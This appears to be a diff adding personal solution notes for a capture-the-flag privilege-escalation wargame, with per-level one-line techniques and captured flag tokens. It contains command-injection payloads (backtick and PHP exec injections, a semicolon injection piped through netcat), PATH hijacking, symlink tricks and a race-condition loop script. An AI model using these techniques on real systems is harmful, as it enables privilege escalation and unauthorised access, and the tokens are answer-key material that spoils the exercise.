@@ -1,0 +1,79 @@
+find / -name flag00 -ls
+
+rot13
+
+x24ti5gi3x0ol2eh4esiuxias
+
+/etc/passwd    > mdp flag01 > jtr
+
+f2av5il02puano7naaf6adaaf
+
+open with cloudshark   -> delete dots
+
+kooda2puivaav1idi4f57q8iq
+
+create echo file in tmp calling getflag > change env path to /tmp
+
+qi0maab88jeaj46qoumi7maus
+
+curl port 4747 \`getflag\`
+
+ne2searoevaevoem4ov4ar8ap
+
+/opt/openareaserver   > getflag > /tmp/test
+
+viuaaale9huek52boumoomioc
+
+[x {${exec(getflag)}}]
+
+wiok45aaoguiboiki2tuin6ub
+
+env LOGNAME=\`getflag\` ./level07
+
+fiumuikeil55xe9cu4dood66h
+
+ln -s /home/user/level08/token /tmp/isse
+
+25749xKZ8L7DkSCwJkT9dyv6f
+
+#argecho.py
+
+import sys
+
+i = 0;
+
+while i < len(sys.argv[1]):
+	print chr(ord(sys.argv[1][i]) - i),
+	i += 1
+
+s5cAJpM8ev6XHw998pRWG728z
+
+
+#!/bin/bash
+
+while true
+do
+        ln -sf /tmp/file /tmp/link ; ln -sf ~/token /tmp/link
+done
+
+
+
+!/bin/bash
+
+while true
+do
+        ~/level10 /tmp/link 127.0.0.1
+done
+
+
+nc -l 127.0.0.1 6969
+
+feulo4b72j7edeahuete3no7c
+
+
+echo "; getflag > /tmp/test.txt  ; echo" | netcat 127.0.0.1 5151
+
+
+fa6v5ateaw21peobuub8ipe6s
+
+
